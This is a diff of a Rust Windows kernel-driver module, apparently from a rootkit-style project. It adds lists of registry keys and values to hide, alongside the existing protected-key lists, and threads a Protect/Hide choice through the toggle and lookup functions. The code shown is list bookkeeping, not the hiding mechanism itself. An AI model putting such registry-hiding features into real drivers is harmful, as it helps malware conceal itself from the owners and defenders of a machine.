@@ -4,12 +4,14 @@ use {
     alloc::{string::{String, ToString}, vec::Vec}, 
     core::marker::PhantomData, 
     shared::structs::TargetRegistry, 
-    spin::{lazy::Lazy, Mutex}, 
+    spin::{lazy::Lazy, Mutex, MutexGuard}, 
+    utils::KeyListType, 
     wdk_sys::{NTSTATUS, STATUS_DUPLICATE_OBJECTID, STATUS_SUCCESS, STATUS_UNSUCCESSFUL}
 };
 
 #[cfg(not(feature = "mapper"))]
 pub mod callback;
+pub mod utils;
 #[cfg(not(feature = "mapper"))]
 pub use callback::*;
 
@@ -18,6 +20,12 @@ pub static TARGET_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> = Lazy::new(|| 
 
 /// List of target keys.
 static TARGET_KEYS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));
+
+/// List of hide keys.
+static HIDE_KEYS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));
+
+/// List of keys and target values.
+static HIDE_KEY_VALUES: Lazy<Mutex<Vec<(String, String)>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(20)));
 
 /// Trait defining common operations for registry lists.
 trait RegistryList<T> {
@@ -29,6 +37,7 @@ trait RegistryList<T> {
     ///
     /// # Returns
     /// - `NTSTATUS`: Status code indicating success or failure of the operation.
+    ///
     fn add_item(list: &mut Vec<T>, item: T) -> NTSTATUS;
 
     /// Removes an item from the registry list.
@@ -39,6 +48,7 @@ trait RegistryList<T> {
     ///
     /// # Returns
     /// - `NTSTATUS`: Status code indicating success or failure of the operation.
+    ///
     fn remove_item(list: &mut Vec<T>, item: &T) -> NTSTATUS;
 
     /// Checks if an item is in the registry list.
@@ -49,6 +59,7 @@ trait RegistryList<T> {
     ///
     /// # Returns
     /// - `bool`: Returns true if the item is in the list, or false otherwise.
+    /// 
     fn contains_item(list: &Vec<T>, item: &T) -> bool;
 }
 
@@ -88,7 +99,7 @@ impl RegistryList<(String, String)> for Vec<(String, String)> {
 impl RegistryList<String> for Vec<String> {
     fn add_item(list: &mut Vec<String>, item: String) -> NTSTATUS {
         if list.len() >= 20 {
-            log::error!("The list of protected keys is full");
+            log::error!("The list of keys is full");
             return STATUS_UNSUCCESSFUL;
         }
 
@@ -129,14 +140,29 @@ impl Registry<(String, String)> {
     ///
     /// # Returns
     /// - `NTSTATUS`: Status code indicating success or failure of the operation.
-    pub fn add_remove_registry_toggle(target: *mut TargetRegistry) -> NTSTATUS {
-        let mut list = TARGET_KEY_VALUES.lock();
-        let key = unsafe { &(*target).key };
-        let value = unsafe { &(*target).value };
-        let status = if unsafe { (*target).enable } {
-            Vec::add_item(&mut list, (key.clone(), value.clone()))
-        } else {
-            Vec::remove_item(&mut list, &(key.clone(), value.clone()))
+    /// 
+    pub fn add_remove_registry_toggle(target: *mut TargetRegistry, list_type: KeyListType) -> NTSTATUS {
+        let key = unsafe { (*target).key.clone() };
+        let value = unsafe { (*target).value.clone() };
+        let enable = unsafe { (*target).enable };
+
+        let status = match list_type {
+            KeyListType::Protect => {
+                let mut list = TARGET_KEY_VALUES.lock();
+                if enable {
+                    Vec::<(String,String)>::add_item(&mut list, (key, value))
+                } else {
+                    Vec::<(String,String)>::remove_item(&mut list, &(key, value))
+                }
+            }
+            KeyListType::Hide => {
+                let mut list = HIDE_KEY_VALUES.lock();
+                if enable {
+                    Vec::<(String,String)>::add_item(&mut list,(key, value))
+                } else {
+                    Vec::<(String,String)>::remove_item(&mut list, &(key, value))
+                }
+            }
         };
 
         status
@@ -150,9 +176,9 @@ impl Registry<(String, String)> {
     ///
     /// # Returns
     /// - `bool`: Returns true if the key-value pair is in the list, or false otherwise.
-    pub fn check_target(key: String, value: String) -> bool {
-        let list = TARGET_KEY_VALUES.lock();
-        Vec::contains_item(&list, &(key, value))
+    /// 
+    pub fn check_target(key: String, value: String, list: MutexGuard<Vec<(String, String)>>) -> bool {
+        Vec::<(String, String)>::contains_item(&list, &(key, value))
     }
 }
 
@@ -165,15 +191,31 @@ impl Registry<String> {
     ///
     /// # Returns
     /// - `NTSTATUS`: Status code indicating success or failure of the operation.
-    pub fn add_remove_key_toggle(target: *mut TargetRegistry) -> NTSTATUS {
+    /// 
+    pub fn add_remove_key_toggle(target: *mut TargetRegistry, list_type: KeyListType) -> NTSTATUS {
         let key = unsafe { &(*target).key }.to_string();
         let enable = unsafe { (*target).enable };
-        let mut list = TARGET_KEYS.lock();
-        if enable {
-            Vec::add_item(&mut list, key)
-        } else {
-            Vec::remove_item(&mut list, &key)
-        }
+
+        let status = match list_type {
+            KeyListType::Protect => {
+                let mut list = TARGET_KEYS.lock();
+                if enable {
+                    Vec::add_item(&mut list, key)
+                } else {
+                    Vec::remove_item(&mut list, &key)
+                }
+            }
+            KeyListType::Hide => {
+                let mut list = HIDE_KEYS.lock();
+                if enable {
+                    Vec::add_item(&mut list, key)
+                } else {
+                    Vec::remove_item(&mut list, &key)
+                }
+            }
+        };
+
+        status
     }
 
     /// Checks if the key is in the list of protected keys.
@@ -183,8 +225,7 @@ impl Registry<String> {
     ///
     /// # Returns
     /// - `bool`: Returns true if the key is in the list, or false otherwise.
-    pub fn check_key(key: String) -> bool {
-        let list = TARGET_KEYS.lock();
+    pub fn check_key(key: String, list: MutexGuard<Vec<String>>) -> bool {
         Vec::contains_item(&list, &key)
     }
 }
